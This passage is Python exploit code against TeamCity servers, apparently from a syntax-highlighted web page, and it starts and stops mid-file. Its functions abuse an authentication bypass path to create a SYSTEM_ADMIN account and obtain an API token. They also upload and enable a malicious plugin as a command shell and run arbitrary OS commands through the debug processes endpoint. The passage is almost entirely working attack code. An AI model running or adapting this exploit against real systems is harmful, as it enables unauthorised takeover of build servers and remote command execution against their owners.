    zip_plugin<span class="token punctuation">.</span>write<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.jar&quot;</span></span><span class="token punctuation">,</span> arcname<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;server/</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.jar&quot;</span></span><span class="token punctuation">)</span>
    zip_plugin<span class="token punctuation">.</span>writestr<span class="token punctuation">(</span><span class="token string">&quot;teamcity-plugin.xml&quot;</span><span class="token punctuation">,</span> evil_plugin_xml<span class="token punctuation">)</span>
    zip_plugin<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GetPluginInfoJson</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        load_evil_plugin_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/admin/admin.html?item=plugins&quot;</span>
        load_evil_plugin_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span>
        <span class="token punctuation">}</span>
        load_evil_plugin_response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>load_evil_plugin_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>load_evil_plugin_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                                                allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        register_plugin_pattern <span class="token operator">=</span> <span class="token string">r&quot;BS\\.Plugins\\.registerPlugin\\(&#39;([^&#39;]*)&#39;, &#39;[^&#39;]*&#39;,[^,]*,[^,]*,\\s*&#39;([^&#39;]*)&#39;\\);&quot;</span>
        plugin_info_json <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        register_plugin_matches <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>register_plugin_pattern<span class="token punctuation">,</span> load_evil_plugin_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">for</span> register_plugin_match <span class="token keyword">in</span> register_plugin_matches<span class="token punctuation">:</span>
            plugin_name_ <span class="token operator">=</span> register_plugin_match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            uuid <span class="token operator">=</span> register_plugin_match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
            plugin_info_json<span class="token punctuation">[</span>plugin_name_<span class="token punctuation">]</span> <span class="token operator">=</span> uuid
        <span class="token keyword">return</span> plugin_info_json
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">GetCSRFToken</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    get_csrf_token_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/authenticationTest.html?csrf&quot;</span>
    get_csrf_token_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    get_csrf_token_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>get_csrf_token_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>get_csrf_token_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> get_csrf_token_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> get_csrf_token_response<span class="token punctuation">.</span>text
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

<span class="token keyword">def</span> <span class="token function">LoadEvilPlugin</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> plugin_name<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    plugin_info_json <span class="token operator">=</span> GetPluginInfoJson<span class="token punctuation">(</span>target<span class="token punctuation">,</span> token<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> plugin_info_json<span class="token punctuation">.</span>get<span class="token punctuation">(</span>plugin_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] The plugin just uploaded cannot be obtained. It may have been deleted by the administrator or AV or EDR&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        load_evil_plugin_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/admin/plugins.html&quot;</span>
        load_evil_plugin_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
        load_evil_plugin_data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f&quot;enabled=true&amp;action=setEnabled&amp;uuid=</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_info_json<span class="token punctuation">[</span>plugin_name<span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        load_evil_plugin_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>load_evil_plugin_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>load_evil_plugin_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>load_evil_plugin_data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> load_evil_plugin_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token string">&quot;&lt;response&gt;Plugin loaded successfully&lt;/response&gt;&quot;</span> <span class="token keyword">in</span> load_evil_plugin_response<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token string">&quot;is already loaded&lt;/response&gt;&quot;</span> <span class="token keyword">in</span> load_evil_plugin_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] Successfully load plugin </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Failed to load plugin </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">UploadEvilPlugin</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> plugin_name<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        upload_evil_plugin_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/admin/pluginUpload.html&quot;</span>
        upload_evil_plugin_header <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
        <span class="token punctuation">}</span>
        files <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;fileName&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.zip&quot;</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;file:fileToUpload&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.zip&quot;</span></span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>plugin_name<span class="token punctuation">}</span></span><span class="token string">.zip&quot;</span></span><span class="token punctuation">,</span> <span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;application/zip&quot;</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
        upload_evil_plugin_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>upload_evil_plugin_url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span>
                                                   headers<span class="token operator">=</span>upload_evil_plugin_header<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                                                   allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> upload_evil_plugin_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">ExecuteCommandByDebugEndpoint</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> os_version<span class="token punctuation">,</span> command<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        command_encoded <span class="token operator">=</span> quote_plus<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
        <span class="token keyword">if</span> os_version <span class="token operator">==</span> <span class="token string">&quot;linux&quot;</span><span class="token punctuation">:</span>
            exec_cmd_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&quot;/app/rest/debug/processes?exePath=/bin/sh&amp;params=-c&amp;params=</span><span class="token interpolation"><span class="token punctuation">{</span>command_encoded<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            exec_cmd_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&quot;/app/rest/debug/processes?exePath=cmd.exe&amp;params=/c&amp;params=</span><span class="token interpolation"><span class="token punctuation">{</span>command_encoded<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span>
        exec_cmd_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
        <span class="token punctuation">}</span>
        exec_cmd_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>exec_cmd_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>exec_cmd_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                                         allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r&quot;StdOut:(.*?)StdErr:(.*?)$&quot;</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>DOTALL<span class="token punctuation">)</span>
        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> exec_cmd_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
            stdout_content <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> stdout_content <span class="token operator">==</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">:</span>
                stderr_content <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>stderr_content<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;\\n\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>stdout_content<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Match failed. Response text: \\n&quot;</span> <span class="token operator">+</span> exec_cmd_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Error in func &lt;ExecuteCommand&gt;, error message: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ExecuteCommandByEvilPlugin</span><span class="token punctuation">(</span>shell_url<span class="token punctuation">,</span> command<span class="token punctuation">,</span> token<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        command_encoded <span class="token operator">=</span> quote_plus<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
        exec_cmd_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;Authorization&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;Bearer </span><span class="token interpolation"><span class="token punctuation">{</span>token<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span><span class="token punctuation">,</span>
            <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded&quot;</span>
        <span class="token punctuation">}</span>
        exec_cmd_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>shell_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>exec_cmd_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f&quot;cmd=</span><span class="token interpolation"><span class="token punctuation">{</span>command_encoded<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> exec_cmd_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>exec_cmd_response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Response Code: </span><span class="token interpolation"><span class="token punctuation">{</span>exec_cmd_response<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">, Response text: </span><span class="token interpolation"><span class="token punctuation">{</span>exec_cmd_response<span class="token punctuation">.</span>text<span class="token punctuation">}</span></span><span class="token string">\\n&quot;</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Error in func &lt;ExecuteCommand&gt;, error message: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">AddUser</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> domain<span class="token punctuation">)</span><span class="token punctuation">:</span>
    add_user_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">&quot;/hax?jsp=/app/rest/users;.jsp&quot;</span>
    add_user_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;Content-Type&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    add_user_data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;username&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
        <span class="token string">&quot;password&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
        <span class="token string">&quot;email&quot;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">@</span><span class="token interpolation"><span class="token punctuation">{</span>domain<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">,</span>
        <span class="token string">&quot;roles&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;role&quot;</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">{</span>
                    <span class="token string">&quot;roleId&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;SYSTEM_ADMIN&quot;</span><span class="token punctuation">,</span>
                    <span class="token string">&quot;scope&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;g&quot;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        add_user_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>add_user_url<span class="token punctuation">,</span> json<span class="token operator">=</span>add_user_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>add_user_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span>
                                         verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        user_id <span class="token operator">=</span> GetUserID<span class="token punctuation">(</span>add_user_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">if</span> add_user_response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> user_id <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[+] User added successfully, username: </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">, password: </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>password<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">, user ID: </span><span class="token interpolation"><span class="token punctuation">{</span>GREEN<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>user_id<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>RESET<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> user_id
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;[-] Failed to add user, there is no vulnerability in </span><span class="token interpolation"><span class="token punctuation">{</span>target<span class="token punctuation">}</span></span><span class="token string">&quot;</span></span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> err<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[-] Error in func &lt;AddUser&gt;, error message: &quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">GetToken</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    exploit_url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f&quot;/hax?jsp=/app/rest/users/id:</span><span class="token interpolation"><span class="token punctuation">{</span>user_id<span class="token punctuation">}</span></span><span class="token string">/tokens/</span><span class="token interpolation"><span class="token punctuation">{</span>token_name<span class="token punctuation">}</span></span><span class="token string">;.jsp&quot;</span></span>
    exploit_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&quot;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exploit_response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>exploit_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>exploit_headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxy<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>
                                        allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">600</span><span class="token punctuation">)</span>
        root <span class="token operator">=</span> ET<span class="token punctuation">.</span>fromstring<span class="token punctuation">(</span>exploit_response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        token_info <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;value&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;value&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">&quot;creationTime&quot;</span><span class="token punctuation">:</span> root<span class="token punctuation">.</span>attrib<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&quot;creationTime&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">}</span>
